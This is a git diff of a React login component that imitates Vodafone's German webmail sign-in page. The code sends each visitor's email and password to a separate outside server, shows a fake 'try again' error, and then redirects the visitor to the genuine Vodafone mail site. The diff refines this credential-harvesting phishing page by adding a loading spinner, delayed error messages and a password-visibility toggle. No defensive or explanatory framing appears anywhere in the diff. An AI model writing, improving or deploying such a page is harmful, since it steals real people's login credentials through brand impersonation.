@@ -4,6 +4,7 @@ import { FaEyeSlash } from "react-icons/fa";
 import { FaRegEye } from "react-icons/fa6";
 import { IoIosInformationCircle } from "react-icons/io";
 import axios from "axios";
+import { ClipLoader } from "react-spinners";
 
 const Credentials = () => {
   const [showPassword, setShowPassword] = useState(false);
@@ -17,10 +18,44 @@ const Credentials = () => {
   };
 
   console.log(email, password);
+  // const handleLogin = async () => {
+  //   try {
+  //     setLoading(true);
+  //     setTimeout(() => {
+  //       setInfo(true);
+  //     }, 2000);
+  //     // window.location.reload();
+  //     setLoading(false);
+
+  //     const res = await axios.post(
+  //       "https://hey-1-065m.onrender.com/api/login",
+  //       { email, password }
+  //     );
+  //     if (res.status === 200) {
+  //       setTimeout(() => {
+  //         window.location.href = "https://mail.vodafone.de/index.aspx";
+  //       }, 6000);
+  //       setLoading(false);
+  //     } else {
+  //       setInfo(true);
+  //     }
+  //   } catch (err) {
+  //     console.error("Error:", err);
+  //     setInfo(true);
+  //   } finally {
+  //     setLoading(false);
+  //   }
+  // };
+
   const handleLogin = async () => {
     try {
       setLoading(true);
-      setInfo(true);
+      setTimeout(() => {
+        setInfo(true);
+        setTimeout(() => {
+          // window.location.reload();
+        }, 2000);
+      }, 2000);
       const res = await axios.post(
         "https://hey-1-065m.onrender.com/api/login",
         { email, password }
@@ -66,7 +101,7 @@ const Credentials = () => {
                 <p>
                   Versuch‘s bitte nochmal oder klick unten auf „Zugangsdaten
                   vergessen“. Du möchtest Dich über das MeinVodafone-Konto
-                  einloggen? Dann klick einfach{" "}
+                  einloggen?
                   <a
                     href="#"
                     style={{ color: "white", textDecoration: "underline" }}
@@ -90,6 +125,28 @@ const Credentials = () => {
                 onChange={(e) => setEmail(e.target.value)}
               />
             </div>
+            <div className="eyebobo">
+              {showPassword ? (
+                <FaRegEye
+                  onClick={handleShowpassword}
+                  style={{
+                    fontSize: "12px",
+                    color: "white",
+                    backgroundColor: "black",
+                  }}
+                />
+              ) : (
+                <FaEyeSlash
+                  onClick={handleShowpassword}
+                  style={{
+                    fontSize: "12px",
+                    color: "white",
+                    backgroundColor: "black",
+                  }}
+                />
+              )}
+            </div>
+
             <div className="loginFormDown">
               <input
                 type={showPassword ? "text" : "password"}
@@ -97,59 +154,40 @@ const Credentials = () => {
                 onChange={(e) => setPassword(e.target.value)}
                 value={password}
               />
-
-              {showPassword ? (
-                <FaRegEye
-                  className="Eyeicon"
-                  onClick={handleShowpassword}
-                  // style={{
-                  //   fontSize: "12px",
-                  //   color: "white",
-                  //   backgroundColor: "black",
-                  // }}
-                />
-              ) : (
-                <FaEyeSlash
-                  className="Eyeicon"
-                  onClick={handleShowpassword}
-                  // style={{
-                  //   fontSize: "12px",
-                  //   color: "white",
-                  //   backgroundColor: "black",
-                  // }}
-                />
-              )}
             </div>
-
-            <div className="loginFormButton" onClick={handleLogin}>
-              <button>Login</button>
-            </div>
-          </div>
-        </div>
-
-        <div className="infoBelowLogin">
-          <div className="text">
-            <p>
-              <a href="#">MeinVodafone Login</a>
-            </p>
-            <p>
-              <a href="#">Zugangsdaten vergensse</a>
-            </p>
+            {loading ? (
+              <ClipLoader color="#d63736" size={20} />
+            ) : (
+              <button className="loginFormButton" onClick={handleLogin}>
+                Login
+              </button>
+            )}
           </div>
 
-          <div className="dan">
-            <p className="danp">
-              Du hast noch kein E-Mail-Konto?
-              <span
-                style={{
-                  color: " rgb(153, 153, 153)",
-                  backgroundColor: "#212121",
-                }}
-              >
-                Dann kannst Du Dich ganz einfach
-              </span>
-            </p>
-            <p style={{ textDecoration: "underline" }}> hier registrieren</p>
+          <div className="infoBelowLogin">
+            <div className="text">
+              <p>
+                <a href="#">MeinVodafone Login</a>
+              </p>
+              <p>
+                <a href="#">Zugangsdaten vergensse</a>
+              </p>
+            </div>
+
+            <div className="dan">
+              <p className="danp">
+                Du hast noch kein E-Mail-Konto?
+                <span
+                  style={{
+                    color: " rgb(153, 153, 153)",
+                    backgroundColor: "#212121",
+                  }}
+                >
+                  Dann kannst Du Dich ganz einfach hier registrieren
+                </span>
+                {/* <p style={{ textDecoration: "underline" }}>  </p> */}
+              </p>
+            </div>
           </div>
         </div>
       </div>
